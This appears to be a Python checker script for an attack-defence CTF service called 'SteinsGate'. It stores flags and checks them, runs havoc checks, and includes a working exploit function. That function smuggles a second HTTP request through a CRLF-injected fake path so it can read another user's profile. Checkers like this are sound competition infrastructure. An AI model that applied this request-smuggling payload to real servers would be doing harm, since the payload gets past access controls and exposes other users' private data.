import asyncio
from http3 import do_post, do_get, do_request_fakepath
import json

from logging import LoggerAdapter
from urllib.parse import urlencode, quote_plus
import string
import random

from enochecker3.utils import assert_in, FlagSearcher

from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)

PORT = 4433

checker = Enochecker("SteinsGate", PORT)
app = lambda: checker.app

noise_alph = string.ascii_letters + string.digits
def noise(nmin: int, nmax: int) -> str:
    n = random.randint(nmin, nmax)
    return "".join(random.choice(noise_alph) for _ in range(n))

def randomPhone():
    return "".join(random.choice(string.digits) for _ in range(11))

def assert_status_code(logger: LoggerAdapter, path: str, status: str, headers, body, code: int = 200) -> None:
    try:
        status = status[2:-1]
        status_code = int(status.split(" ")[0])
        if status_code == code:
            return
        logger.error(f"Bad status code during request at {path}: ({status_code} != {code})\n{body}")
        raise MumbleException(f"Received {status_code} code at {path} failed")
    except:
        raise MumbleException(f"Error parsing status code")

async def do_login(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, username: str, password: str) -> None:
    path = "/login"
    payload = {"username":username,"password":password}
    status, headers, body = await do_post(task.address, PORT, path, {}, urlencode(payload, quote_via=quote_plus))
    assert_status_code(logger, path, status, headers, body)
    try:
        return json.loads(body)["token"]
    except KeyError as k:
        logger.error(f"No token was retrieved when login, {k.msg}")
        raise MumbleException(f"No token was retrieved when login")
    except (json.JSONDecodeError, TypeError) as k:
        logger.error(f"Error decoding body, {k.msg}")
        raise MumbleException(f"Error decoding body")
    except Exception as k:
        logger.error(f"Caught another exception, {k.msg}")
    return None


async def do_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, token: str = None, username: str = None, password: str = None) -> None:
    path = "/profile"
    if token is None:
        token = await do_login(task, logger, username, password)
    status, headers, body = await do_get(task.address, PORT, path, {"x-token":token})
    assert_status_code(logger, path, status, headers, body)
    try:
        return json.loads(body)
    except (json.JSONDecodeError, TypeError) as k:
        logger.error(f"Error decoding body, {k.msg}")
        raise MumbleException(f"Error decoding body")
    except Exception as k:
        logger.error(f"Caught another exception, {k.msg}")
    return None

async def do_addphone(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, phone: str, token: str = None, username: str = None, password: str = None) -> None:
    path = "/addphone"
    if token is None:
        token = await do_login(task, logger, username, password)
    payload = {"phone":phone}
    status, headers, body = await do_post(task.address, PORT, path, {"x-token":token}, urlencode(payload, quote_via=quote_plus))
    assert_status_code(logger, path, status, headers, body, code=201)
    try:
        return json.loads(body)
    except (json.JSONDecodeError, TypeError) as k:
        logger.error(f"Error decoding body, {k.msg}")
        raise MumbleException(f"Error decoding body")
    except Exception as k:
        logger.error(f"Caught another exception, {k.msg}")

async def do_register(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, username: str, password: str) -> None:
    path = "/register"
    payload = {"username":username,"password":password}
    status, headers, body = await do_post(task.address, PORT, path, {}, urlencode(payload, quote_via=quote_plus))
    assert_status_code(logger, path, status, headers, body, code=201)
    try:
        return json.loads(body)
    except (json.JSONDecodeError, TypeError) as k:
        logger.error(f"Error decoding body, {k.msg}")
        raise MumbleException(f"Error decoding body")
    except Exception as k:
        logger.error(f"Caught another exception, {k.msg}")

@checker.putflag(0)
async def putflag(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB) -> str:
    username = noise(10, 20)
    password = noise(10, 20)
    await do_register(task, logger, username, password)
    token = await do_login(task, logger, username, password)
    await do_addphone(task, logger, task.flag, token=token)
    await db.set("info", token)
    return username

@checker.getflag(0)
async def getflag(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB) -> None:
    try:
        token = await db.get("info")
    except KeyError:
        raise MumbleException("Database info missing")
    r = await do_profile(task, logger, token=token)
    if "data" in r:
        if len(r["data"]) != 0:
            if "phones" in r["data"][0]:
                phones = r["data"][0]["phones"]
                assert_in(task.flag, phones, f"Flag missing")
            else:
                logger.debug(f"Phones are missing for team {task.team_name}")
                raise MumbleException("Phones are missing in profile response")
        else:
            logger.debug(f"Data is empty in profile response for team {task.team_name}")
            raise MumbleException("Data is empty in profile response")
    else:
        logger.debug(f"Data is missing in profile response for team {task.team_name}")
        raise MumbleException("Data is missing in profile response")

@checker.putnoise(0)
async def putnoise(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
    username = noise(10, 20)
    password = noise(10, 20)
    await do_register(task, logger, username, password)
    token = await do_login(task, logger, username, password)
    phone = randomPhone()
    await do_addphone(task, logger, phone, token=token)
    await db.set("info1", (token, phone))

@checker.getnoise(0)
async def getnoise(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
    try:
        token, phone = await db.get("info1")
    except KeyError:
        raise MumbleException("Database info1 missing")
    r = await do_profile(task, logger, token=token)
    if "data" in r:
        if len(r["data"]) != 0:
            if "phones" in r["data"][0]:
                phones = r["data"][0]["phones"]
                assert_in(phone, phones, f"Phone missing in profile")
            else:
                logger.debug(f"Phones are missing for team {task.team_name}")
                raise MumbleException("Phones are missing in profile response")
        else:
            logger.debug(f"Data is empty in profile response for team {task.team_name}")
            raise MumbleException("Data is empty in profile response")
    else:
        logger.debug(f"Data is missing in profile response for team {task.team_name}")
        raise MumbleException("Data is missing in profile response")

@checker.havoc(0)
async def havoc_safado(task: HavocCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
    username = noise(10, 20)
    password = noise(10, 20)
    await do_register(task, logger, username, password)
    token = await do_login(task, logger, username, password)
    path = f"/user/{username}"
    status, headers, body = await do_get(task.address, PORT, path, {"x-token":token})
    assert_status_code(logger, path, status, headers, body, code=403)
    assert_in("Cant do that", body, "You must protect your /user!")

@checker.havoc(1)
async def havoc_hacker(task: HavocCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
    path = "/login"
    username = noise(10, 20)
    password = noise(10, 20)
    payload = {"username":username,"password":password}
    status, headers, body = await do_post(task.address, PORT, path, {}, urlencode(payload, quote_via=quote_plus))
    assert_status_code(logger, path, status, headers, body, 400)

@checker.havoc(2)
async def havoc_healthcheck(task: HavocCheckerTaskMessage, logger: LoggerAdapter, db: ChainDB):
    path = "/"
    status, headers, body = await do_get(task.address, PORT, path, {})
    assert_status_code(logger, path, status, headers, body, 200)


@checker.exploit(0)
async def exploit_simple_smugling(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher) -> str:
    if task.attack_info == "":
        raise InternalErrorException("Missing attack info")
    username_to_hack = task.attack_info

    username, password = noise(10, 20), noise(10, 20)

    await do_register(task, logger, username, password)
    token = await do_login(task, logger, username, password)
    path = f"/user/{username_to_hack}"
    true_path = "/ HTTP/1.1\r\nHost: localhost\r\n\r\nGET " + path
    status, headers, body = await do_request_fakepath(task.address, PORT, "GET", path, true_path, {"x-token":token}, None)
    assert_status_code(logger, path, status, headers, body, code=200)

    return searcher.search_flag(body)

if __name__ == "__main__":
    checker.run()
